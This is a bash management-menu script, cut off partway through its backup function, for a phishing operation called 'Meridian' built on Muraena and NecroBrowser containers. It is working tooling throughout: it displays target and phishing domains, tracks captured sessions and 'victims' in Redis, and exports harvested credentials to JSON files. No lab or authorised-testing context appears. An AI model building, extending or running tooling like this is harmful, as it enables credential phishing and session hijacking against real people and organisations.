#!/bin/bash
################################################################################
# MERIDIAN INTERACTIVE MANAGEMENT MENU
# Post-deployment configuration and monitoring interface
################################################################################

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
GENERATED_DIR="$CONFIG_DIR/generated"
LOG_DIR="$SCRIPT_DIR/logs"
ENV_FILE="$SCRIPT_DIR/.env"

# Load environment if exists
if [ -f "$ENV_FILE" ]; then
    set -a
    source "$ENV_FILE"
    set +a
fi

################################################################################
# UTILITY FUNCTIONS
################################################################################

print_header() {
    clear
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                    🌊 MERIDIAN CONTROL CENTER 🌊                          ║
║                                                                           ║
║              Interactive Management & Monitoring Interface                ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo ""
}

print_section() {
    echo -e "${BOLD}${BLUE}━━━ $1 ━━━${NC}"
    echo ""
}

print_info() {
    echo -e "${CYAN}ℹ${NC} $1"
}

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_menu_item() {
    local num="$1"
    local desc="$2"
    echo -e "  ${BOLD}${CYAN}[$num]${NC} $desc"
}

pause() {
    echo ""
    echo -e "${DIM}Press Enter to continue...${NC}"
    read -r
}

confirm() {
    local prompt="$1"
    echo -e "${YELLOW}?${NC} $prompt (y/N): "
    read -r response
    [[ "$response" =~ ^[Yy]$ ]]
}

################################################################################
# SERVICE MANAGEMENT
################################################################################

show_service_status() {
    print_header
    print_section "Service Status"
    
    echo -e "${BOLD}Container Status:${NC}"
    docker-compose ps
    echo ""
    
    echo -e "${BOLD}Health Status:${NC}"
    for service in redis muraena necrobrowser web-panel; do
        local health=$(docker inspect --format='{{.State.Health.Status}}' meridian-$service 2>/dev/null || echo "no healthcheck")
        local status=$(docker inspect --format='{{.State.Status}}' meridian-$service 2>/dev/null || echo "not found")
        
        if [ "$status" = "running" ]; then
            if [ "$health" = "healthy" ]; then
                print_success "$service: Running (Healthy)"
            elif [ "$health" = "no healthcheck" ]; then
                print_info "$service: Running (No healthcheck)"
            else
                print_warning "$service: Running ($health)"
            fi
        else
            print_error "$service: $status"
        fi
    done
    
    echo ""
    echo -e "${BOLD}Resource Usage:${NC}"
    docker stats --no-stream --format "table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}" \
        meridian-redis meridian-muraena meridian-necrobrowser meridian-panel 2>/dev/null || \
        print_warning "Unable to fetch resource stats"
    
    pause
}

start_services() {
    print_header
    print_section "Starting Services"
    
    if confirm "Start all Meridian services?"; then
        print_info "Starting services..."
        docker-compose up -d
        
        print_info "Waiting for services to be healthy..."
        sleep 10
        
        print_success "Services started"
        show_service_status
    fi
}

stop_services() {
    print_header
    print_section "Stopping Services"
    
    if confirm "Stop all Meridian services?"; then
        print_info "Stopping services..."
        docker-compose down
        print_success "Services stopped"
    fi
    pause
}

restart_services() {
    print_header
    print_section "Restarting Services"
    
    echo "Select service to restart:"
    print_menu_item "1" "All services"
    print_menu_item "2" "Muraena only"
    print_menu_item "3" "NecroBrowser only"
    print_menu_item "4" "Redis only"
    print_menu_item "0" "Cancel"
    echo ""
    
    read -p "Choice: " choice
    
    case $choice in
        1)
            print_info "Restarting all services..."
            docker-compose restart
            print_success "All services restarted"
            ;;
        2)
            print_info "Restarting Muraena..."
            docker-compose restart muraena
            print_success "Muraena restarted"
            ;;
        3)
            print_info "Restarting NecroBrowser..."
            docker-compose restart necrobrowser
            print_success "NecroBrowser restarted"
            ;;
        4)
            print_info "Restarting Redis..."
            docker-compose restart redis
            print_success "Redis restarted"
            ;;
        0)
            return
            ;;
    esac
    
    pause
}

view_logs() {
    print_header
    print_section "Service Logs"
    
    echo "Select service:"
    print_menu_item "1" "Muraena"
    print_menu_item "2" "NecroBrowser"
    print_menu_item "3" "Redis"
    print_menu_item "4" "Web Panel"
    print_menu_item "5" "All services (live tail)"
    print_menu_item "0" "Back"
    echo ""
    
    read -p "Choice: " choice
    
    case $choice in
        1) docker-compose logs --tail=100 -f muraena ;;
        2) docker-compose logs --tail=100 -f necrobrowser ;;
        3) docker-compose logs --tail=100 -f redis ;;
        4) docker-compose logs --tail=100 -f web-panel ;;
        5) docker-compose logs --tail=50 -f ;;
        0) return ;;
    esac
}

################################################################################
# MONITORING & STATISTICS
################################################################################

show_campaign_stats() {
    print_header
    print_section "Campaign Statistics"
    
    if [ -f "$ENV_FILE" ]; then
        echo -e "${BOLD}Campaign Information:${NC}"
        echo "  Name:           ${CAMPAIGN_NAME:-N/A}"
        echo "  Target Domain:  ${TARGET_DOMAIN:-N/A}"
        echo "  Phishing Domain: ${PHISHING_DOMAIN:-N/A}"
        echo "  Deploy Date:    ${DEPLOY_DATE:-N/A}"
        echo ""
    fi
    
    echo -e "${BOLD}Redis Statistics:${NC}"
    if docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" INFO stats 2>/dev/null | grep -E "total_connections_received|total_commands_processed|keyspace_hits|keyspace_misses"; then
        :
    else
        print_warning "Unable to fetch Redis stats"
    fi
    echo ""
    
    echo -e "${BOLD}Captured Sessions:${NC}"
    local session_count=$(docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" KEYS "session:*" 2>/dev/null | wc -l || echo "0")
    echo "  Total Sessions: $session_count"
    echo ""
    
    echo -e "${BOLD}Victim Tracking:${NC}"
    local victim_count=$(docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" KEYS "victim:*" 2>/dev/null | wc -l || echo "0")
    echo "  Total Victims: $victim_count"
    echo ""
    
    pause
}

show_live_monitoring() {
    print_header
    print_section "Live Monitoring"
    
    print_info "Starting live monitoring (Ctrl+C to exit)..."
    echo ""
    
    while true; do
        clear
        print_header
        echo -e "${BOLD}Live Monitoring - $(date '+%Y-%m-%d %H:%M:%S')${NC}"
        echo ""
        
        # Service status
        echo -e "${BOLD}Services:${NC}"
        for service in redis muraena necrobrowser; do
            local status=$(docker inspect --format='{{.State.Status}}' meridian-$service 2>/dev/null || echo "down")
            if [ "$status" = "running" ]; then
                echo -e "  ${GREEN}●${NC} $service"
            else
                echo -e "  ${RED}●${NC} $service"
            fi
        done
        echo ""
        
        # Resource usage
        echo -e "${BOLD}Resources:${NC}"
        docker stats --no-stream --format "  {{.Container}}: CPU {{.CPUPerc}} | MEM {{.MemPerc}}" \
            meridian-redis meridian-muraena meridian-necrobrowser 2>/dev/null
        echo ""
        
        # Recent activity
        echo -e "${BOLD}Recent Activity:${NC}"
        docker-compose logs --tail=5 --no-log-prefix 2>/dev/null | tail -5
        
        sleep 5
    done
}

export_credentials() {
    print_header
    print_section "Export Credentials"
    
    local export_dir="$SCRIPT_DIR/exports"
    mkdir -p "$export_dir"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local export_file="$export_dir/credentials_${timestamp}.json"
    
    print_info "Exporting credentials from Redis..."
    
    # Export all session data
    docker-compose exec -T redis redis-cli -a "${REDIS_PASSWORD}" --json KEYS "session:*" 2>/dev/null > "$export_file.tmp" || {
        print_error "Failed to export credentials"
        pause
        return
    }
    
    # Format and save
    cat "$export_file.tmp" | jq '.' > "$export_file" 2>/dev/null || mv "$export_file.tmp" "$export_file"
    rm -f "$export_file.tmp"
    
    print_success "Credentials exported to: $export_file"
    
    if [ -s "$export_file" ]; then
        local count=$(cat "$export_file" | jq '. | length' 2>/dev/null || echo "unknown")
        print_info "Total sessions exported: $count"
    fi
    
    pause
}

################################################################################
# CONFIGURATION MANAGEMENT
################################################################################

view_configuration() {
    print_header
    print_section "Current Configuration"
    
    if [ -f "$ENV_FILE" ]; then
        echo -e "${BOLD}Environment Configuration:${NC}"
        cat "$ENV_FILE" | grep -v "^#" | grep -v "^$"
        echo ""
    else
        print_warning "No .env file found"
    fi
    
    if [ -f "$GENERATED_DIR/muraena_config.toml" ]; then
        echo -e "${BOLD}Muraena Configuration:${NC}"
        echo "  Location: $GENERATED_DIR/muraena_config.toml"
        echo ""
    fi
    
    if [ -f "$GENERATED_DIR/necrobrowser_config.json" ]; then
        echo -e "${BOLD}NecroBrowser Configuration:${NC}"
        echo "  Location: $GENERATED_DIR/necrobrowser_config.json"
        echo ""
    fi
    
    pause
}

edit_configuration() {
    print_header
    print_section "Edit Configuration"
    
    echo "Select configuration to edit:"
    print_menu_item "1" "Environment (.env)"
    print_menu_item "2" "Muraena (config.toml)"
    print_menu_item "3" "NecroBrowser (config.json)"
    print_menu_item "0" "Back"
    echo ""
    
    read -p "Choice: " choice
    
    local editor="${EDITOR:-nano}"
    
    case $choice in
        1)
            if [ -f "$ENV_FILE" ]; then
                $editor "$ENV_FILE"
                print_warning "Restart services for changes to take effect"
            else
                print_error ".env file not found"
            fi
            ;;
        2)
            if [ -f "$GENERATED_DIR/muraena_config.toml" ]; then
                $editor "$GENERATED_DIR/muraena_config.toml"
                print_warning "Restart Muraena for changes to take effect"
            else
                print_error "Muraena config not found"
            fi
            ;;
        3)
            if [ -f "$GENERATED_DIR/necrobrowser_config.json" ]; then
                $editor "$GENERATED_DIR/necrobrowser_config.json"
                print_warning "Restart NecroBrowser for changes to take effect"
            else
                print_error "NecroBrowser config not found"
            fi
            ;;
        0)
            return
            ;;
    esac
    
    pause
}

backup_configuration() {
    print_header
    print_section "Backup Configuration"
    
    local backup_dir="$SCRIPT_DIR/backups"
    mkdir -p "$backup_dir"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local backup_file="$backup_dir/meridian_backup_${timestamp}.tar.gz"
    
    print_info "Creating backup..."
    
    tar -czf "$backup_file" \
        -C "$SCRIPT_DIR" \
        .env \
        config/generated \
        docker-compose.yml \
        2>/dev/null || {
        print_error "Backup failed"
        pause
        return
    }
